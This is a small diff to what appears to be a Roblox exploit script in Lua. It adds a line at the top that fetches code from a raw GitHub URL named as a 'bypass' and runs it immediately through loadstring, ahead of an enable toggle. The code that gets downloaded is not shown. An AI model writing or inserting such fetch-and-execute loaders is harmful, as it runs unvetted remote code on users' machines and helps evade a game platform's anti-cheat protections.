@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Astonlix/commands/main/bypass%20%5Bnot%20a%20command%5Dr"))()
+
 getgenv().Enabled = true
 
 if Enabled == true then
